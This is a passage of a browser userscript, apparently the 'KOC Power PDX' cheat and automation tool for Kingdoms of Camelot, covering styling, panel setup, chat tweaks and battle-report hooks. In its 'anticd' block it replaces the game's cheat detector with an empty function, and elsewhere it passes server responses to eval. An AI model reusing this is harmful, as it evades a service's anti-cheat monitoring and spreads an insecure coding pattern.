	.kocmain .mod_comm .mod_comm_mmb { left:'+merlinsBoxLeft+'; margin-top:'+merlinsBoxTop+';}\
	.pdxInfoBox {background-image:url('+Options.devBG+'); font-variant:small-caps; padding: 2px 3px; border-radius: 3px 3px 40px 3px;  -moz-box-shadow: 0 0 2px 2px '+pdxStyleSelBoxShadow+'; color: #FFFFFF;  height: 260px;  margin-left: 765px;  margin-top: '+pdxInfoBoxTop+';  width: 335px; }\
	.pdxInfoBox a {color:#FFF; top:-2px; transition-duration: 0.2s; -moz-transition-duration: 0.2s; -webkit-transition-duration: 0.2s; -o-transition-duration: 0.2s;}\
	.pdxInfoBox a:hover { color: #FF0000; margin-left: 2px;  box-shadow: 1px 1px 2px 0px #FF0000; padding: 0px 3px 0px 3px; }\
	.pdxStyleSel {  font-variant:small-caps; padding: 2px 3px; border-radius: 3px 3px 3px 3px;  -moz-box-shadow: 0 0 2px 2px '+pdxStyleSelBoxShadow+'; color: #FFFFFF;  margin-left: 765px;  margin-top: '+pdxStyleSelTop+'; position: absolute; width: 360px; background-image:url('+Options.devBG+'); } \
	.pdxDisableMenu {margin-left:100px;}\
	.pdxErrorPopup { color:white; font-weight:bold;   width: 200px;  margin-left: 650px; margin-top: 4px;background:#141516; -moz-border-radius: 3px; border: 0.5px solid #FF0000; -moz-box-shadow: 0 0 3px 2px #FF0000}\
	.showBadged { color:white; font-weight:bold;   width: 200px;  margin-left: 650px; margin-top: 4px;background:#141516; -moz-border-radius: 3px; border: 0.5px solid #FF0000; -moz-box-shadow: 0 0 3px 2px #FF0000}\
	span#pbMailBody_top {  color:white; font-weight:bold}\
	span#pbMailBody_top div  {     width: 200px;  margin-left: 650px; margin-top: 4px;background:#141516; -moz-border-radius: 3px; border: 0.5px solid #CCC; -moz-box-shadow: 0 0 3px 2px #CCC}\
	span#pbShowTrans_top {  color:white; font-weight:bold}\
	span#pbShowTrans_top div  {     width: 200px;  margin-left: 650px; margin-top: 4px;background:#141516; -moz-border-radius: 3px; border: 0.5px solid #0A690C; -moz-box-shadow: 0 0 3px 2px #0A690C}\
	span#pbShowRein_top {  color:white; font-weight:bold}\
	span#pbShowRein_top div  {     width: 200px;  margin-left: 650px; margin-top: 4px;background:#141516; -moz-border-radius: 3px; border: 0.5px solid #0A690C; -moz-box-shadow: 0 0 3px 2px #0A690C}\
	span#pbShowOther_top {  color:white; font-weight:bold}\
	span#pbShowOther_top div  {     width: 200px;  margin-left: 650px; margin-top: 4px;background:#141516; -moz-border-radius: 3px; border: 0.5px solid #FF0000; -moz-box-shadow: 0 0 3px 2px #FF0000}\
	.pb_top {width:100px;}\
	.enablePDXMenu {width:100px; height:0px;}\
	.kocmain {height: 860px; }\
	'+hideKoCButtons+'\
	'+hideKoCHeader+'\
	'+hideKoCBottomStuff+'\
	'+showHideFriendList+'\
	.kofc_iframe_1 { display: none !important; }\
	.pdxInfoSpamStyle { color:#141516; background-color: '+Colors.SpamBackground+'; -moz-box-shadow: 0 0 3px 2px '+Colors.SpamBackground+'; padding:8px; margin-Bottom:3px; -moz-border-radius:3px; }\
	.pdxStatBoarder { border: 0.5px inset '+Colors.MainTitle+';}\
	.tourny_list_table { padding: 10px; -moz-border-radius:5px; border:3px solid #000000; }\
	.kocFooter { display:none }\
	.'+culang.ally+' td{background:royalblue; }\
	.'+culang.hostile+' td { background:#FF4040; }\
	.'+culang.friendly+' td{background:lightgreen; }\
	.'+culang.neutral+' td { background:#C8C8C8; }\
	.'+culang.noally+' td { background:gold; }\
	.xtabBR {padding-right: 5px; border:none; background:none;}\
	div.ptDiv {background-color:'+Colors.OverviewDarkRow+';}\
	.xtab {padding-right: 5px; border:none; background:none; white-space:nowrap; }\
	table.pdxTab tr td {border:none; background:none; white-space:nowrap;}\
	table.pdxTabOverview tr td {border-left:1px solid #ccc; white-space:nowrap; padding: 1px; background-color:'+Colors.OverviewDarkRow+';}\
	.pdxTrainTrpRes {  padding:5pdx; -moz-box-shadow:inset 0px 0px 5px #000; }\
	.pdxStat {border: 0.5px solid '+Colors.MainTitleSch+'; -moz-border-radius:2px; -moz-box-shadow: inset 0px 0px 3px '+Colors.MainTitleSch+'; font-weight:bold; padding-top:2px; padding-bottom:2px; text-align:center; color:'+Colors.MainTitleSch+';	background-color:'+Colors.MainTitle+'}\
	.pbDetLeft {padding:0 5px 0 0 !important; font-weight:bold; text-align:right}\
	.ptOddrow {background-color:'+Colors.DarkRow+'}\
	.pdxStatLight {color:'+Colors.StatsU+'}\
	.pdxEntry {padding: 7px; border:1px solid #000000; background-color:#ffeecc; white-space:nowrap;}\
	.ptErrText {font-weight:bold; color:#600000}\
	.castleBut {outline:0px; margin-left:0px; margin-right:0px; width:24px; height:26px; font-size:12px; font-weight:bold;}\
	.castleBut:hover {border-size:3px; border-color:#000;}\
	button::-moz-focus-inner, input[type="submit"]::-moz-focus-inner { border: none; }\
	.ptChatLowFood {background-color: '+ Colors.lowFoodBG +';}	.ptChatUser1Sou {background-color: '+ Colors.userBGUsrSou1 +';}\
	.ptChatUser1 {background-color: '+ Colors.userBG1 +';}		.ptChatUser2 {background-color: '+ Colors.userBG2 +';}	.ptChatUser3 {background-color: '+ Colors.userBG3 +';}	.ptChatUser4 {background-color: '+ Colors.userBG4 +';}	.ptChatUser5 {background-color: '+ Colors.userBG5 +';}	.ptChatUser6 {background-color: '+ Colors.userBG6 +';}	.ptChatUser7 {background-color: '+ Colors.userBG7 +';}	.ptChatUser8 {background-color: '+ Colors.userBG8 +';}	.ptChatUser9 {background-color: '+ Colors.userBG9 +';}	.ptChatUser10 {background-color: '+ Colors.userBG10 +';}	.ptChatUser11 {background-color: '+ Colors.userBG11 +';}		.ptChatUser12 {background-color: '+ Colors.userBG12 +';}	.ptChatUser13 {background-color: '+ Colors.userBG13 +';}	.ptChatUser14 {background-color: '+ Colors.userBG14 +';}	.ptChatUser15 {background-color: '+ Colors.userBG15 +';}	.ptChatUser16 {background-color: '+ Colors.userBG16 +';}	.ptChatUser17 {background-color: '+ Colors.userBG17 +';}	.ptChatUser18 {background-color: '+ Colors.userBG18 +';}	.ptChatUser19 {background-color: '+ Colors.userBG19 +';}	.ptChatUser10 {background-color: '+ Colors.userBG20 +';}	.ptChatUser21 {background-color: '+ Colors.userBG21 +';}		.ptChatUser22 {background-color: '+ Colors.userBG22 +';}	.ptChatUser23 {background-color: '+ Colors.userBG23 +';}	.ptChatUser24 {background-color: '+ Colors.userBG24 +';}	.ptChatUser25 {background-color: '+ Colors.userBG25 +';}	.ptChatUser26 {background-color: '+ Colors.userBG26 +';}	.ptChatUser27 {background-color: '+ Colors.userBG27 +';}	.ptChatUser28 {background-color: '+ Colors.userBG28 +';}	.ptChatUser29 {background-color: '+ Colors.userBG29 +';}	.ptChatUser10 {background-color: '+ Colors.userBG30 +';}\
	.ptWildAttack { font-weight:bold; background-color:'+Colors.WildAttack+'; }\
	.ptChatAttack { font-weight:bold; background-color:'+Colors.ChatAngriff+'; }\
	.ptChatWhisper {font-weight:bold; color:red;}\
	.ptChatAlliance {background-color:#77DDFF;color:#000}\
	.ptChatAllianz {font-weight:bold;background-color:#77DDFF;color:#000}\
	.ptChatScripter {}\
	.ptChatOfficers {color:#000; background-color:'+Colors.ChatLeader+';}\
	span.whiteOnRed {padding-left:3px; padding-right:3px; background-color:#700; color:white; font-weight:bold}\
	span.boldRed {color:#800; font-weight:bold}\
	span.boldGreen {color:green; font-weight:bold}\
	span.pdxCapShadowRR {color:#0000; font-weight:bold;text-shadow: 1px 1px 1px #FF0000; font-variant:small-caps;}\
	span.pdxCapShadowRW {color:#0000; font-weight:bold;text-shadow: 1px 1px 1px #FFFFFF; font-variant:small-caps;}\
	span.pdxCapShadowSG {color:#0000; font-weight:bold;text-shadow: 1px 1px 1px #00BB33; font-variant:small-caps;}\
	span.pdxCapShadow {color:#0000; font-weight:bold;text-shadow: 1px 1px 1px #AAA; font-variant:small-caps; text-align:center}\
	span.pdxCapShadowRed {color:#600000; font-weight:bold;text-shadow: 1px 1px 1px #AAA; font-variant:small-caps; text-align:center}\
	span.pdxCapShadowI {color:#0000; font-style:italic;text-shadow: 1px 1px 1px #AAA; font-variant:small-caps; text-align:center}\
	.castleButNon {background-image:url("'+ URL_CASTLE_BUT +'")}\
	.castleButSel {background-image:url("'+ URL_CASTLE_BUT_SEL +'")}\
	input.pbDefButOn {cursor:pointer; border:1px solid black; background-color:red;}\
	input.pbDefButOff {cursor:pointer; border:1px solid black; background-color:#0a0;}\
	a.ptButton20 {color:#ffff80}\
	hr.ptThin {padding:0px; margin:0px}\
	input.pdxSubtab {font-variant:small-caps; -moz-box-shadow:inset 0px 0px 3px #600000; -moz-border-radius:3px; cursor:pointer;border:outset 1px #ccc;background:#999;color:#666;padding: 1px 2px;background:url(http://koc-power-pdx.googlecode.com/svn/trunk/img/formbg.gif) repeat-x left top;}\
	input.pdxSubtabSel {font-variant:small-caps; color:#141516; font-weight:bold; font-size:17px; cursor:none !important}\
	input.pbSubtab { -moz-box-shadow:inset 0px 0px 3px #600000; -moz-border-radius:3px; font-variant:small-caps; cursor:pointer; width:12em; font-weight:bold; margin-right:15px;}\
	input.pbSubtabSel {  -moz-box-shadow:inset 0px 0px 3px #600000; -moz-border-radius:3px; font-variant:small-caps; background-color:#444; color:white; font-weight:bold; font-size:17px; cursor:none !important}\
    .body#mainbody div#pb_outer.CPopup table tbody tr#pb_bar.pbPopTop td span#pb_top table.pbMainTab tbody { background:none }\
	table.pbMainTab { background: #600000; border: 0.5px solid #FFF; -moz-box-shadow: 0 0 3px 2px #FFF; -moz-border-radius:3px; empty-cells: show;  margin-left: -4px;  margin-top: -3px; padding: 1px; }\
	table.pbMainTab tr td a {font-variant:small-caps; color: #FFF; text-decoration: none; }\
	table.pbMainTab tr td a:hover {-webkit-transition:all 180ms ease-in;-o-transition:all 180ms ease-in;-moz-transition:all 180ms ease-in;  color:#FF0000}\
	table.pbMainTab tr td   {margin-left:6px; empty-cells:show; padding: 0px 5px 0px 5px;   }\
	table.pbMainTab tr td.spacer {border: 1px; padding: 0px 1px;}\
	table.pbMainTab tr td.notSel {  border:1px solid #FFF; -moz-border-radius:3px; background:#141516;  width:110px; height:15px;-moz-box-shadow:inset 0px 0px 3px #FFF; }\
	table.pbMainTab tr td.sel { border:1px solid #FFF; -moz-border-radius:3px; background:#141516; height:15px; -moz-box-shadow:inset 0px 0px 3px #FF0000; }\
	table.pbMainTab tr td.sel a {color:#FF0000; }\
	table.pdxTabPadNW tr td {border:none; background:none; white-space:nowrap; padding: 2px 4px 2px 8px;}\
	table.pdxTabBR tr td {border:none; background:none;}\
	table.pdxTabLined tr td {border:1px none none solid none; padding: 2px 5px; white-space:nowrap; -moz-box-shadow: inset 0px 0px '+Colors.OptShadow+'px '+Colors.OptShadowCol+';}\
	table.pdxOptions tr td {border:1px none none solid none; white-space:nowrap; padding: 1px 3px;  -moz-box-shadow: inset 0px 0px '+Colors.OptShadow+'px '+Colors.OptShadowCol+'; -moz-border-radius:2px;}\
	table.pbSrchResults tr td {border:1px none none solid none; padding: 1px 3px; white-space:nowrap;}\
	table.pdxTabSome tr td {border:none; background:none; padding: 1px 3px; white-space:nowrap;}\
	table.pdxTabPad tr td.pdxEntry {background-color:#ffeecc; padding-left: 8px;}\
	table.ptNoPad tr td {border:none; background:none; white-space:nowrap; padding:0px}\
	tr.pbMainPopTop td { background-color:'+Colors.TabHinMain+'; border:none; height: 42px; color:#000000; text-shadow: 3px 3px 3px #FFFFFF;}\
	tr.pbretry_pbMainPopTop td { background-color:#a00; color:#fff; border:none; height: 42px;  padding:0px; }\
	tr.pbPopTop td { width:116px; float:left; margin-left:-139px; height:10px;}\
	tr.pbretry_pbPopTop td {   color:#fff; border:none; height: 21px;  padding:0px; }\
	.CPopup .CPopMain  { -moz-box-shadow:inset 0px 0px 30px #600000; -moz-border-radius:3px; border:1px solid #141516;}\
	.Cpopup { -moz-box-shadow:inset 0px 0px 30px #600000; -moz-border-radius:3px; border:1px solid #141516;}\
	.pb_CPopup { opacity:'+Colors.TabTrans+'; -moz-box-shadow:inset 0px 0px 30px #600000; -moz-border-radius:3px; border:1px solid #141516;}\
	span.pbTextFreundlich {color: #080}\
	span.pbTextFeindlich {color: #800}\
	div.indent25 {padding-left:25px}';
	
if (TEST_WIDE){  // max cityname len = 15?
  for(i=0; i<Seed.cities.length; i++){
    Seed.cities[i][1] = Seed.cities[i][1] + 'LONGERNAMETEST';
    Seed.cities[i][1] = Seed.cities[i][1].substr(0,15);
  }
  var numToAdd = TEST_WIDE_CITIES - Seed.cities.length;
  while (numToAdd-- > 0){
    var cityId = Math.random() * 1234567;
    Seed.cities.push (Seed.cities[0]);
  }    
}
  window.name = 'PDX';
  logit (""+kocpower+" - "+culang.scriptv+": "+ Version +" - "+culang.by+" PDX "+culang.loaded+"");

  setCities();
  readAttackOptions();
  readAutoTrainOptions();
  readCrestOptions(); 

  if(!GlobalOptions.pbWideScreen && Options.pbWinPos.x > 700){
    var c = getClientCoords (document.getElementById('main_engagement_tabs'));
    Options.pbWinPos.x = c.x+4;
    saveOptions ();
  }
  if (Options.pbWinPos==null || Options.pbWinPos.x==null|| Options.pbWinPos.x=='' || isNaN(Options.pbWinPos.x)){
    var c = getClientCoords (document.getElementById('main_engagement_tabs'));
    Options.pbWinPos.x = c.x+4;
    Options.pbWinPos.y = c.y+c.height;
    saveOptions ();
  }
  mainPop = new CPopup ('pb', Options.pbWinPos.x, Options.pbWinPos.y, 650,750, Options.pbWinDrag,
      function (){
        tabManager.hideTab();
        Options.pbWinIsOpen=false;
        saveOptions()
  });
  
  mainPop.autoHeight (true);
  mainPop.getMainDiv().innerHTML = '<STYLE>'+ styles + kocPowerMainStyle +'</style>';
  
	AddMainTabLink('POWER', eventHideShow, mouseMainTab);
	tabManager.init (mainPop.getMainDiv());
	FairieKiller.init (Options.pbKillFairie);
	RefreshEvery.init ();
	CollectGold.init();
  
	if (Options.pdxTimeZones=="estTimeZone") estClock.init ();
	if (Options.pdxTimeZones=="cestTimeZone") cestClock.init ();
	if (Options.pdxTimeZones=="gmtTimeZone") gmtClock.init ();
	if (Options.pdxTimeZones=="pstTimeZone") pstClock.init ();
	if (Options.pdxTimeZones=="noneTimeZone") noTimeZone.init ();

  if (Options.pbWinIsOpen && Options.pbTrackOpen){
    mainPop.show (true);
    tabManager.showTab();
  }

  readPDXCountOpt();
  readWallTrainOptions();
  if (WallTrainOptions.intervalSecs < 60)
	  WallTrainOptions.intervalSecs = 60;
  saveWallTrainOptions();

  window.addEventListener('unload', onUnload, false);
  exportToKOCattack.init();
  WideScreen.init ();
  WideScreen.setChatOnRight (Options.pbChatOnRight);
  WideScreen.useWideMap (Options.pbWideMap);
  
  getAllianceLeaders();
  MapDistanceFix.init ();
  WarnZeroAttack.init ();
  AllianceReports.init ();
  AttackDialog.init();
  battleReports.init ();
  CoordBox.init ();
  FoodAlerts.init();
  ChatPane.init();
  ChatStuff.init();
  ChatStuffE.init()
  DeleteReports.init();
  SpamEvery.init();
  SpamEveryA.init();
  //PDXCountdown.init();
  if (Options.MapShowExtra) setInterval (DrawLevelIcons,1250);
  
  var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
          params.format=2;
          params.tournyPos=0;
          new AjaxRequest(unsafeWindow.g_ajaxpath+"ajax/getLeaderboard.php"+unsafeWindow.g_ajaxsuffix, {  method:"post",  parameters:params,
         onSuccess:function(transport){
           var rslt=eval("("+transport.responseText+")");
           if(rslt.ok){
            if(rslt.data){
  	      document.getElementById('ptBoite2').innerHTML='<span style="color: #f66">&nbsp;<blink>'+culang.turn+'</blink>&nbsp;</span>';
  	      Options.enableCheckTournoi = false;
  	      saveOptions();
            } else {
              Options.enableCheckTournoi = true;
            }
           } else {
             Options.enableCheckTournoi = true;
           }
          }
  });
  if (Options.enableCheckTournament) checkTournament.init();
  
  actionLog ("<b>"+kocpower+"</b> - "+culang.scriptv+": <span class=boldRed>"+ Version +"</span> - "+culang.by+" "+culang.kocPowerP+"  <span class=boldGreen>"+culang.sucload+"!</span>  (KOC Version: <span class=boldRed>"+ anticd.getKOCversion() +"</span>)"); // ALL INIT LOADED
}

function onUnload (){
  Options.ptWinPos = mainPop.getLocation();
  if (!ResetAll) saveOptions();
  if (!ResetColors) saveColors();
  if (!ResetStyleOptions) saveStyleOptions(); 
}
var CoordBox = {
  init : function (){

    var t = CoordBox;
    t.boxDiv = searchDOM (document.getElementById('maparea_map'), 'node.className=="mod_coord"', 3, false);
    t.setEnable (Options.mapCoordsTop);
  },
  setEnable : function (tf){
    var t = CoordBox;
    if (t.boxDiv == null)
      return;
    if (tf)
      t.boxDiv.style.zIndex = '100000';
    else
      t.boxDiv.style.zIndex = '10011';
  },
  isAvailable : function (){
    var t = CoordBox;
    return !(t.boxDiv==null);
  },
}
var battleReports = {
  init : function (){
    var t = battleReports; 
    t.getReportDisplayFunc = new CalterUwFunc ('getReportDisplay', [['return t.join("")', 'var themsg=t.join(""); themsg=getReportDisplay_hook(themsg, arguments[1]); return themsg']]); //Alliance report battle rounds function
    uW.getReportDisplay_hook = t.hook;
    t.getReportDisplayFunc.setEnable (true);
    t.renderBattleReportFunc = new CalterUwFunc ('Messages.viewMarchReport', [['$("modal_msg_list").innerHTML = cm.MarchReportController.getMarchReport(m, r);','var msg = cm.MarchReportController.getMarchReport(m, r); $("modal_msg_list").innerHTML = renderBattleReport_hook(msg,m,r);']]); //March reports battle rounds function
    uW.renderBattleReport_hook = t.hook2;
    t.renderBattleReportFunc.setEnable (true);
    uW.deleteAreport = t.e_deleteReport;
    uW.MoreReport = t.e_MoreReport;
    uW.PostReport = t.e_PostReport;
  },

  isRoundsAvailable : function (){
    var t = battleReports; 
    return t.getReportDisplayFunc.isAvailable();
  },
  
  e_deleteReport : function (rptid){
    var t = battleReports; 
    t.ajaxDeleteMyReport (rptid);
  },
  
  e_MoreReport : function (rptid,side){
    var t = battleReports; 
    alert('WIP ;)');
  },
  
  e_PostReport : function (rptid){
      var msg = ''+culang.report+': ' + rptid; 
      sendChat ("/a "+  msg);
  },
  
  SendChat:function(name,mess) {
    	var inp=document.getElementById('mod_comm_input');
    	inp.value="@"+name+' '+mess;
    	unsafeWindow.Chat.sendChat();
  },
      
  ajaxDeleteMyReport : function (rptid, isUnread, side, isCityReport, notify){
    var params = uW.Object.clone(uW.g_ajaxparams);
    params.s0rids = rptid;
    params.s1rids = '';
    params.cityrids = '';
    new MyAjaxRequest(uW.g_ajaxpath + "ajax/deleteCheckedReports.php" + uW.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        if (rslt.ok && isUnread){
          uW.seed.newReportCount = parseInt(seed.newReportCount) - 1;
          uW.messages_notify_bug()
        }    
        if (notify)
          notify (rslt.errorMsg);
      },
      onFailure: function () {
        if (notify)
          notify ('AJAX ERROR');
      },
    });
  },
  
  hook2 : function (msg, args, rslt){
	//alert('hook2 '+rslt);
    if (rslt.rnds && Options.dispBattleRounds){
      msg = msg.replace (/<\/ul>.*\s*<\/div>.*\s*<div class="unitsContainer">/im, '<li><span class=\'label\'>Rounds: </span><span class=\'value\'>'+ rslt.rnds +'</span></li></ul></div><div class="unitsContainer">');
    }
	if (Options.reportDeleteButton){
		msg = msg.replace(/Reports<\/span><\/a>/im, 'Reports</span></a><a class=\'button20\' onclick=\'PostReport('+args[0]+',false)\'><span>Post To Chat</span></a>'); //Post to Chat button
		msg = msg.replace(/Reports<\/span><\/a>/im, 'Reports</span></a><a class=\'button20\' onclick=\'MoreReport('+args[0]+','+args[1]+',false)\'><span>More</span></a>'); //More button
		msg = msg.replace(/Reports<\/span><\/a>/im, 'Reports</span></a><a class=\'button20\' onclick=\'deleteAreport('+args[0]+',false)\'><span>'+uW.g_js_strings.commonstr.deletetx+'</span></a>'); //Delete button
	}
    return msg;
  },
  hook : function (msg, rslt){
	//alert('hook '+rslt);
    if (rslt.rnds && Options.dispBattleRounds){
	  msg = msg.replace (culang.rndAttackers, '$1<BR>'+culang.rounds+': '+ rslt.rnds +'</div>');
    }
    return msg;
  },
}
var anticd = {
  isInited : false,
  KOCversion : '?',
  
  init: function (){
    if (this.isInited)
      return this.KOCversion;
    unsafeWindow.cm.cheatDetector.detect = eval ('function a (){}');
    var scripts = document.getElementsByTagName('script');
    for (var i=0; i<scripts.length; i++){
      if (scripts[i].src.indexOf('camelotmain') >=0){
        break;
      }
    }
    if (i<scripts.length){
      var m = scripts[i].src.match (/camelotmain-(.*).js/);  
      if (m)
        this.KOCversion = m[1];
    }
    this.isInited = true;
    // more coming soon :)
  },
  
  getKOCversion : function (){
    return this.KOCversion;
  },
}
try {
  anticd.init ();
} catch (e){
  logit ("ANTICD error: "+ e);
}

var ChatStuffE = {
  chatDivContentFunc : null,
  getChatFunc : null,

  init : function (){
    var t = ChatStuffE;
	t.chatDivContentFunc = new CalterUwFunc ('Chat.chatDivContent', [['return f.join("");', 'var msg = f.join("");\n msg=chatDivContent_hook(msg);\n return msg;']]);
    unsafeWindow.chatDivContent_hook = t.chatDivContentHook;
	unsafeWindow.ptChatReportClicked = Rpt.FindReport;
    t.setEnable (Options.chatEnhance);
  },

  isAvailable : function (){
    var t = ChatStuffE;
    t.chatDivContentFunc.isAvailable ();
  },

  setEnable : function (tf){
    var t = ChatStuffE;
    t.chatDivContentFunc.setEnable (tf);
		if (Options.ChatBGColorGlobal) { document.getElementById("mod_comm_list1").style.backgroundColor = Colors.OwnBackgroundColorGlobal; }	
		if (Options.ChatBGColorAlliance) { document.getElementById("mod_comm_list2").style.backgroundColor = Colors.OwnBackgroundColorAlliance; }	
		if (Options.ChatBGImageGlobal) { document.getElementById("mod_comm_list1").style.backgroundImage = "url(" + Options.OwnBackGroundGlobal + ")"; }	
		if (Options.ChatBGImageAlliance) { document.getElementById("mod_comm_list2").style.backgroundImage = "url(" + Options.OwnBackGroundAlliance + ")"; }
  },
  
  chatDivContentHook : function (msg){
       var t = ChatStuffE; 
       var element_class = '';
       var m = /div class='info'>.*<\/div>/im.exec(msg);
       if (m == null)
         return msg;
       var whisp = m[0];
       
       if (m[0].indexOf(''+culang.whispersa+'') >= 0) {
           	if (Options.chatwhisper) {
           		if (whisp.indexOf(''+culang.whispersa+' ') <0) element_class = 'ptChatWhisper';
           	}
           	else element_class = '';
     }
	 
       else if (m[0].indexOf(''+culang.saytoalli+'') >= 0){
   	if (Options.chatbold)
   		element_class = 'ptChatAlliance';
   	else element_class = '';
           } 
       else {
   	element_class = '';
	
     }
	 
	var scripters = ["7552815","10681588","1747877","2865067","10153485","15182839","1550996","1617431819","9688786","9863346","8184813"];
	var pdxVipAvatars = ["14627712"];
	// var pdxTeamAvatars = ["14259780"];
	var suid = m[0].substring(m[0].indexOf('Chat.viewProfile(this,')+22,m[0].indexOf(',false);return false;'));
    var IsMe = false;
	if (Options.chatLeaders) {
		if (Options.AllianceLeaders.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;
    	if (Options.AllianceLeaders.indexOf(suid) >= 0 || IsMe) element_class = 'ptChatOfficers';
    }
	IsMe = false;
	if (scripters.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;
	if (scripters.indexOf(suid) >= 0 || IsMe) {
	msg = msg.replace (/\bhttps\:\/\/[-a-z].*jpg/i,'data:image/png;base64,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');
	element_class = 'ptChatScripter';
	}
	
	if (pdxVipAvatars.indexOf(suid) >= 0) {
